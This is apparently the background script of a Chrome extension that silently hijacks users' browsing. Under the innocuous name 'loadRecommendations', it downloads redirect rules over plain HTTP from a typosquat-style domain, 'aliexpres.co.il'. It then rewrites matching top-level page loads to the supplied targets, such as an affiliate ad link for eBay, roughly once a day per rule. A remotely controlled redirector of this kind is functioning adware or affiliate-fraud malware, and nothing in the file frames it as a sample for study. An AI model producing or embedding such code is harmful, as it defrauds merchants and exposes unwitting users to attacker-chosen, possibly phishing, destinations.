
var v=0;
var redirects_url=[];
var MILI_SECONDS=24*60*60*1000;
setRedirects_url(redirects_url);
loadRecommendations();
var timestamps=[];
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
	  	
    var pattern, from, to, redirecUrl;
    //redirects_url = JSON.parse(localStorage.getItem('redirects_url') || '[]');
	//redirects_url=	JSON.parse('[["www.ebay.com","ad.admitad.com/g/kz1hwx56ivf78e368e1764d9e52862"],["kk","kk"]]'||'[]');
	redirects_url=getRedirects_url();
    for (var i=0; i<redirects_url.length; i++) {

      from = redirects_url[i][0];
      to = redirects_url[i][1];
      try {
        pattern = new RegExp(from, 'ig');
      } catch(err) {
        //bad pattern
        continue;
      }
      match = details.url.match(pattern);
	  
      if (match) {
		  let d=new Date();
		if(d.getTime()-redirects_url[i][2]<MILI_SECONDS)
			return {};
        redirectUrl = details.url.replace(pattern, to);
		//redirectUrl=to.concat(details.url);
        if (redirectUrl != details.url) {
			if(d.getTime()-redirects_url[i][2]>=MILI_SECONDS){
				redirects_url[i][2]=d.getTime();
				setRedirects_url(redirects_url);
			}	
			/*setTimeout(function(){ 
				redirects_url[i][2]=0;
				setRedirects_url(redirects_url);
			}, 
			24*60*60*1000);*/
			return {redirectUrl: redirectUrl};
        }
      }
	  
    }
    return {};
  },
  {
    urls: [
      "<all_urls>",
    ],
    types: ["main_frame"]
  },
  ["blocking"]
);




function getRedirects_url() {
  json = localStorage.getItem('redirects_url') || '[]'; 
  return JSON.parse(json);
}

function setRedirects_url(list) {
  localStorage.setItem('redirects_url', JSON.stringify(list));
}



function loadRecommendations() {
    fetch("http://aliexpres.co.il/list.txt")
        .then(response => {
            return response.json();
        })
        .then(text => {
			if(text.length<=0) return;
			localStorage.setItem('list_of_association', JSON.stringify(text));
			fetch("http://aliexpres.co.il/"+text[0]+".txt")
				.then(response => {
					return response.json();
				})
				.then(text => {
							
					for(j=0;j<text.length;j++){
						
						redirects_url.push([text[j][0], text[j][1],0]);
					}
						
					setRedirects_url(redirects_url);	
				
				});			
        });
}